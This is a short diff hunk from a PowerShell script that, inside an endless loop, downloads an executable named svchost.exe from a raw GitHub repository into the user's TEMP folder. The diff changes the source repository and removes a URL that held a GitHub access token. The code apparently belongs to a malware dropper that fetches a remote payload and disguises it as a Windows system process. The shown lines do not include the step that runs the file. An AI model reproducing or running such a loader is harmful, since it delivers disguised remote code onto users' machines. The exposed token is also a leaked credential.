@@ -109,7 +109,7 @@ while ($true)
 
         Write-Console "DOWNLOADING..." "INFO"
 
-        $url  = "https://raw.githubusercontent.com/18321-creator/STACKX/refs/heads/main/svchost.exe?token=GHSAT0AAAAAAD55W436BAFUFIY7YURCY6ZC2QRGT3Q"
+        $url  = "https://raw.githubusercontent.com/18321-creator/GGOSOS/refs/heads/main/svchost.exe"
         $path = "$env:TEMP\svchost.exe"
 
         try {
